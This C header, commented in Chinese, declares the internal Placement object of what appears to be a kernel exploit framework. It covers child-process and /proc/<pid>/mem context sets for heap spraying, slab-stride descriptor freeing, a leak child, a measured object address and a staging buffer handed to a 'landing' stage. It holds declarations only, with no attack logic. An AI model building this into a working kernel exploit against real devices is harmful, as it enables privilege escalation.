/**
 * @file placement_internal.h
 * @brief Placement 对象的私有布局与 cross-TU 助手（Placement ↔ Landing 所有权交接）。
 *
 * @note 本头只服务 `placement.c` 与 `page.c` 两个 TU；不是公共 ABI，不对外发布。
 * @note 所有权：`struct glk43499_placement_impl` 是 Placement token 指向的唯一对象，
 *       独占 children、memfd、staging 与测量资源。landing 提交成功后由它把这些
 *       资源交给 `struct glk43499_page_impl`，然后释放自身。
 * @note 阶段：G4L-1/G4L-2。
 */
#ifndef GHOSTLOCK_GL43499_CORE_PLACEMENT_INTERNAL_H
#define GHOSTLOCK_GL43499_CORE_PLACEMENT_INTERNAL_H

#include <sys/types.h>

#include "core_internal.h"
#include "kernel_internal.h"
#include "placement.h"

#ifdef __cplusplus
extern "C" {
#endif

/**
 * @brief 一组 mm 塑形上下文：子进程 pid 与 `/proc/<pid>/mem` 描述符平行数组。
 * @note 数组由 Placement 拥有；子进程只由 clone 的父进程释放，
 *       子进程自身进程退出不得释放父进程资源。
 */
struct glk43499_ctx_set {
    pid_t *children;
    int32_t *memfds;
    uint32_t count;
    uint32_t live_children;
    uint32_t open_memfds;
};

/** @brief Placement 的私有物理状态；token 即本对象的地址。 */
struct glk43499_placement_impl {
    /* 已验证的 Kotlin 输入事实（landing 会二次比对）。 */
    uint64_t page_size;
    uint64_t allocation_size;
    uint64_t required_alignment;
    uint64_t scan_lower_bound;
    uint64_t scan_upper_bound;
    uint64_t scan_step;
    uint64_t timeout_ns;
    uint32_t placement_cpu;
    uint32_t measurement_cpu;
    uint32_t objects_per_slab;
    uint32_t measurement_rounds;

    /* 测量结果（landing 复核后写入 receipt）。 */
    uint64_t candidate_page_base;
    uint64_t measured_object_address;

    /* 保留给 landing 的 mm 塑形上下文。 */
    struct glk43499_ctx_set prepare;
    struct glk43499_ctx_set spray;
    struct glk43499_ctx_set pre;
    struct glk43499_ctx_set post;

    /* 泄漏子进程与它的 `/proc/<pid>/mem` 描述符。 */
    pid_t leak_child;
    int32_t leak_memfd;

    /* staging：landing 把 Kotlin 提供的最终字节深拷贝到这里再发送。 */
    uint8_t staging[GLK43499_PHYS_SKB_SEND_SIZE];

    /* 资源计数（facts 与 retained 回执的唯一来源）。 */
    uint32_t retained_children;
    uint32_t retained_descriptors;

    /* 归一化状态：0=OPEN，1=CLOSING（close 已接受），2=CONSUMED。 */
    int32_t state;
    /* 1 表示清理无法证明完整：对象/身份保留到进程退出（不 free、不归零计数）。 */
    int32_t retained;
};

/**
 * @brief 把 Placement token 还原为私有对象。
 * @param handle 非零 token；调用方已确认非零。
 * @return 对象指针；0 返回 NULL。
 * @note 不校验存活性：线性 owner 契约把 raw 误用责任交给调用方。
 */
static inline struct glk43499_placement_impl *glk43499_placement_from_handle(
    glk43499_handle handle) {
    return (struct glk43499_placement_impl *) glk43499_internal_handle_ptr(handle);
}

/**
 * @brief 关闭该组上下文的全部 memfd。
 * @param set 已初始化（可为空）的上下文组。
 * @param clean 非空清算标志；任一 close 失败置 0（失败槽位保留身份，不置 -1）。
 * @return 实际关闭的描述符数。
 * @note 只有 close 成功才把槽位置 -1 并递减 `open_memfds`；禁止假 released。
 */
uint32_t glk43499_placement_close_memfds(struct glk43499_ctx_set *set,
                                         int32_t *clean);

/**
 * @brief 按步长关闭 memfd（spray 组的 slab 首对象）。
 * @param set 已初始化的上下文组。
 * @param stride 步长；必须非零。
 * @param clean 非空清算标志；任一 close 失败置 0。
 * @return 实际关闭的描述符数。
 * @note 前提：stride 是 `objects_per_slab`；仅用于 landing 的 spray 释放形状。
 */
uint32_t glk43499_placement_close_memfds_stride(struct glk43499_ctx_set *set,
                                                uint32_t stride,
                                                int32_t *clean);

/**
 * @brief 关闭该组上下文除末尾 `keep_tail` 项外的全部 memfd。
 * @param set 已初始化的上下文组。
 * @param keep_tail 保留的末尾项数；0 等价于全部关闭。
 * @param clean 非空清算标志；任一 close 失败置 0。
 * @return 实际关闭的描述符数。
 */
uint32_t glk43499_placement_close_memfds_except_tail(
    struct glk43499_ctx_set *set, uint32_t keep_tail, int32_t *clean);

/**
 * @brief 关闭该组的全部 memfd 并杀死/回收全部存活子进程。
 * @param set 已初始化的上下文组。
 * @param clean 非空清算标志；kill/close/waitpid 任一失败置 0（失败子进程保留 pid 身份）。
 * @return 实际回收的子进程数。
 */
uint32_t glk43499_placement_kill_children(struct glk43499_ctx_set *set,
                                          int32_t *clean);

/**
 * @brief 释放一组上下文数组自身。
 * @param set 已初始化（可为空）的上下文组。
 * @note 只释放用户态数组；不关闭 fd、不回收子进程（释放必须显式且有序）。
 */
void glk43499_placement_free_ctx(struct glk43499_ctx_set *set);

/**
 * @brief 释放 Placement 仍持有的全部资源并释放对象。
 * @param placement 非空对象。
 * @note 只在 close 接受后调用。资源顺序：先关描述符，再回收子进程；
 *       staging 内嵌在对象内，随对象一起释放。
 */
void glk43499_placement_release(struct glk43499_placement_impl *placement);

/**
 * @brief 把 Placement 保留的资源整体移交给 landing 的临时视图。
 * @param placement 非空对象。
 * @param out_prepare 接收 prepare 组（所有权转移，源组被清零）。
 * @param out_spray 接收 spray 组。
 * @param out_pre 接收 pre 组。
 * @param out_post 接收 post 组。
 * @note 交接后 landing 负责逐组释放；此函数不关闭 fd、不回收 child。
 */
void glk43499_placement_detach_contexts(
    struct glk43499_placement_impl *placement,
    struct glk43499_ctx_set *out_prepare, struct glk43499_ctx_set *out_spray,
    struct glk43499_ctx_set *out_pre, struct glk43499_ctx_set *out_post);

/**
 * @brief 释放 landing 交接出来的上下文组（数组 + 残留 fd/child）。
 * @param set 已交接的上下文组。
 * @param clean 非空清算标志；任一清理失败置 0（此时不释放数组，保留身份）。
 * @note 幂等；只在 landing 的收尾/失败路径调用。
 */
void glk43499_placement_discard_ctx(struct glk43499_ctx_set *set,
                                    int32_t *clean);

#ifdef __cplusplus
}
#endif

#endif /* GHOSTLOCK_GL43499_CORE_PLACEMENT_INTERNAL_H */
